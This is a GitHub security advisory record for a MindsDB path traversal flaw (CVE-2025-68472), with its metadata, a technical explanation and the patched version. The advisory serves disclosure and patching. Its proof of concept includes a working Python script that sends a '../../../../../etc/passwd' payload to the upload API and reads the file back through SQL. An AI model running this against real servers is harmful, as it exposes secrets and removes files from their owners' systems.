{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/70605579?v=4", "events_url": "https://api.github.com/users/locus-x64/events{/privacy}", "followers_url": "https://api.github.com/users/locus-x64/followers", "following_url": "https://api.github.com/users/locus-x64/following{/other_user}", "gists_url": "https://api.github.com/users/locus-x64/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/locus-x64", "id": 70605579, "login": "locus-x64", "node_id": "MDQ6VXNlcjcwNjA1NTc5", "organizations_url": "https://api.github.com/users/locus-x64/orgs", "received_events_url": "https://api.github.com/users/locus-x64/received_events", "repos_url": "https://api.github.com/users/locus-x64/repos", "site_admin": false, "starred_url": "https://api.github.com/users/locus-x64/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/locus-x64/subscriptions", "type": "User", "url": "https://api.github.com/users/locus-x64", "user_view_type": "public"}}], "cve_id": "CVE-2025-68472", "cvss": {"score": 8.1, "vector_string": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H"}, "cvss_severities": {"cvss_v3": {"score": 8.1, "vector_string": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H"}, "cvss_v4": {"score": 0.0, "vector_string": null}}, "cwes": [{"cwe_id": "CWE-22", "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"}, {"cwe_id": "CWE-23", "name": "Relative Path Traversal"}, {"cwe_id": "CWE-36", "name": "Absolute Path Traversal"}], "description": "### Summary

[BlueRock](https://bluerock.io/) discovered an unauthenticated path traversal in the file upload API lets any caller read arbitrary files from the server filesystem and move them into MindsDB’s storage, exposing sensitive data. 

### Details
The PUT handler in file.py directly joins user-controlled data into a filesystem path when the request body is JSON and `source_type` is not `"url"`:

- `data = request.json` (line ~104) accepts attacker input without validation.
- `file_path = os.path.join(temp_dir_path, data["file"])` (line ~178) creates the path inside a temporary directory, but if `data["file"]` is absolute (e.g., `/home/secret.csv`), `os.path.join` ignores `temp_dir_path` and targets the attacker-specified location.
- The resulting path is handed to `ca.file_controller.save_file(...)`, which wraps `FileReader(path=source_path)` (`mindsdb/interfaces/file/file_controller.py:66`), causing the application to read the contents of that arbitrary file. The subsequent `shutil.move(file_path, ...)` call also relocates the victim file into MindsDB’s managed storage.

Only multipart uploads and URL-sourced uploads receive sanitization; JSON uploads lack any call to `clear_filename` or equivalent checks.

### PoC
1. Run MindsDB in Docker:
   ```bash
   docker pull mindsdb/mindsdb:latest
   docker run --rm -it -p 47334:47334 --name mindsdb-poc mindsdb/mindsdb:latest
   ```
2. Execute the exploit from the host (save as poc.py and run with `python poc.py`):
   ```python
   # poc.py
   import requests, json

   base = "http://127.0.0.1:47334"
   payload = {"file": "../../../../../etc/passwd"}  # no source_type -> hits vulnerable branch

   r = requests.put(f"{base}/api/files/leak_rel", json=payload, timeout=10)
   print("PUT status:", r.status_code, r.text)

   q = requests.post(
       f"{base}/api/sql/query",
       json={"query": "SELECT * FROM files.leak_rel"},
       timeout=10,
   )
   print("SQL response:", json.dumps(q.json(), indent=2))
   ```
3. The SQL response returns the contents of `/etc/passwd` . The original file disappears from its source location because the handler moves it into MindsDB’s storage directory.
4. Detailed report is available on BlueRock's blog: https://www.bluerock.io/post/cve-2025-68472-mindsdb-file-upload-path-traversal

### Impact
- Any user able to reach the REST API can read and exfiltrate arbitrary files that the MindsDB process can access, potentially including credentials, configuration secrets, and private keys.", "epss": {"percentage": 0.19213, "percentile": 0.96979}, "ghsa_id": "GHSA-qqhf-pm3j-96g7", "github_reviewed_at": "2026-01-12T16:10:55Z", "html_url": "https://github.com/advisories/GHSA-qqhf-pm3j-96g7", "identifiers": [{"type": "GHSA", "value": "GHSA-qqhf-pm3j-96g7"}, {"type": "CVE", "value": "CVE-2025-68472"}], "nvd_published_at": "2026-01-12T17:15:52Z", "published_at": "2026-01-12T16:10:55Z", "references": ["https://github.com/mindsdb/mindsdb/security/advisories/GHSA-qqhf-pm3j-96g7", "https://github.com/mindsdb/mindsdb/releases/tag/v25.11.1", "https://nvd.nist.gov/vuln/detail/CVE-2025-68472", "https://www.bluerock.io/post/cve-2025-68472-mindsdb-file-upload-path-traversal", "https://github.com/pypa/advisory-database/tree/main/vulns/mindsdb/PYSEC-2026-90.yaml", "https://github.com/advisories/GHSA-qqhf-pm3j-96g7"], "repository_advisory_url": "https://api.github.com/repos/mindsdb/mindshub/security-advisories/GHSA-qqhf-pm3j-96g7", "severity": "high", "source_code_location": "https://github.com/mindsdb/mindsdb", "summary": "MindsDB has improper sanitation of filepath that leads to information disclosure and DOS", "type": "reviewed", "updated_at": "2026-06-06T00:36:40Z", "url": "https://api.github.com/advisories/GHSA-qqhf-pm3j-96g7", "vulnerabilities": [{"first_patched_version": "25.11.1", "package": {"ecosystem": "pip", "name": "MindsDB"}, "vulnerable_functions": [], "vulnerable_version_range": "< 25.11.1"}], "withdrawn_at": null}

title: MindsDB has improper sanitation of filepath that leads to information disclosure and DOS
